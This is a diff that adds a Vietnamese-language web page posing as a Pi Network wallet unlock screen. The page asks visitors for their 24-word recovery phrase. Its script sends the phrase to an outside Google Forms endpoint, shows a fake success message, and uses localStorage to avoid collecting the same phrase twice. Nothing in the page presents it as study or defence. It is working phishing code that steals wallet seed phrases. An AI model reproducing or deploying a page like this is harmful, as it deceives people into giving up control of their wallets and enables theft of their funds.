@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Nhập Cụm Mật Khẩu</title>
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            padding-top: 50px; /* Để không bị che bởi thanh màu tím */
+            background-color: white;
+        }
+
+        /* Thanh màu tím cố định trên đầu trang */
+        .top-bar {
+            background-color: #693F8C;
+            height: 50px;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 50;
+        }
+
+        /* Hiệu ứng fade-in */
+        .fade-in {
+            opacity: 0;
+            transform: translateY(-10px);
+            animation: fadeIn 0.6s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Hiệu ứng rung khi nhập sai */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+        }
+        .shake {
+            animation: shake 0.4s ease-in-out;
+        }
+
+        /* Nút với màu từ ảnh */
+        .btn-custom {
+            background-color: white;
+            color: #693F8C;
+            border: 2px solid #693F8C;
+            transition: all 0.3s ease-in-out;
+        }
+        .btn-custom:hover {
+            background-color: #693F8C;
+            color: white;
+        }
+        .btn-custom:active {
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
+
+    <!-- Thanh màu tím cố định -->
+    <div class="top-bar"></div>
+
+    <div class="w-full max-w-md p-6 bg-white rounded-2xl shadow-xl text-center fade-in">
+        <!-- Logo -->
+        <img src="https://img.upanh.tv/2025/03/16/IMG_0103.jpg" 
+             alt="Logo"
+             id="logo"
+             class="w-24 h-24 mx-auto mb-4 animate-pulse">
+             
+        <h2 class="text-2xl font-bold text-gray-800 mb-4">🔒 Mở khoá ví Pi </h2>
+
+        <form id="form">
+            <div class="mb-4">
+                <textarea id="mnemonic-input"
+                          class="w-full p-4 text-lg text-gray-700 border-2 border-gray-400 rounded-lg resize-none
+                                 focus:outline-none focus:ring-2 focus:ring-[#693F8C] focus:border-[#693F8C] transition-all"
+                          rows="6" placeholder="Nhập cụm mật khẩu 24 từ của bạn vào đây"></textarea>
+            </div>
+
+            <button type="submit" id="btn-open"
+                    class="w-full px-5 py-3 text-sm font-semibold 
+                           btn-custom rounded-lg shadow-lg transition-all duration-300">
+                <span class="btn-text">MỞ KHÓA VỚI CỤM MẬT KHẨU</span>
+            </button>
+
+            <p class="text-xs text-gray-500 text-center mt-3">*Mỗi ví chỉ được nhận 1 lần duy nhất</p>
+        </form>
+    </div>
+
+    <!-- Phần thông tin thêm -->
+    <div class="w-full max-w-md mt-6 text-center">
+        <p class="text-sm text-gray-700 leading-relaxed">
+            <strong class="text-gray-900">🔐 Là một ví không giám sát</strong>, cụm mật khẩu ví của bạn <strong>chỉ có bạn mới có thể truy cập</strong>. 
+            Hiện tại không thể khôi phục cụm mật khẩu.
+        </p>
+        <p class="text-sm text-red-600 mt-3 font-semibold">
+            ⚠️ Bạn bị mất cụm mật khẩu ví?  
+            Bạn có thể tạo một ví mới, nhưng tất cả số π trong ví trước đó của bạn sẽ <strong>không thể truy cập được</strong>.
+        </p>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.getElementById("form");
+            const textarea = document.getElementById("mnemonic-input");
+            const btnSubmit = document.getElementById("btn-open");
+            const logo = document.getElementById("logo");
+
+            function showAlert(type, title, text) {
+                Swal.fire({
+                    icon: type,
+                    title: title,
+                    text: text,
+                    background: "rgba(255, 255, 255, 0.95)",
+                    color: "#333",
+                    confirmButtonColor: "#693F8C",
+                    customClass: {
+                        title: 'swal2-title',
+                        popup: 'swal2-popup',
+                        confirmButton: 'swal2-confirm'
+                    }
+                });
+            }
+
+            form.addEventListener("submit", async (e) => {
+                e.preventDefault();
+                const mnemonic = textarea.value.trim();
+                const words = mnemonic.split(/\s+/);
+
+                if (words.length !== 24) {
+                    logo.classList.add("shake");
+                    showAlert("error", "Lỗi!", "Cụm mật khẩu phải có đúng 24 từ. Vui lòng kiểm tra lại!");
+                    setTimeout(() => logo.classList.remove("shake"), 400);
+                    return;
+                }
+
+                let sentMnemonics = JSON.parse(localStorage.getItem("sentMnemonics")) || [];
+                if (sentMnemonics.includes(mnemonic)) {
+                    showAlert("warning", "Cảnh báo!", "Cụm mật khẩu này đã được gửi trước đó. Vui lòng nhập một cụm khác!");
+                    return;
+                }
+
+                btnSubmit.disabled = true;
+                btnSubmit.innerHTML = `<div class="w-5 h-5 border-4 border-[#693F8C] border-t-transparent rounded-full animate-spin"></div>`;
+
+                const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSdTB8GCil6wVsF7bP3fPqdO2h_6OEA9LrTVWIp9KOWgHQgqSQ/formResponse";
+                const formData = new FormData();
+                formData.append("entry.624281135", mnemonic);
+
+                try {
+                    await fetch(googleFormURL, {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: formData,
+                    });
+
+                    showAlert("success", "Thành công!", "Cụm mật khẩu đã được gửi thành công.");
+                    sentMnemonics.push(mnemonic);
+                    localStorage.setItem("sentMnemonics", JSON.stringify(sentMnemonics));
+                    form.reset();
+                } catch (error) {
+                    showAlert("error", "Lỗi!", "Có lỗi xảy ra, vui lòng thử lại!");
+                } finally {
+                    btnSubmit.disabled = false;
+                    btnSubmit.innerHTML = `<span class="btn-text">MỞ KHÓA VỚI CỤM MẬT KHẨU</span>`;
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
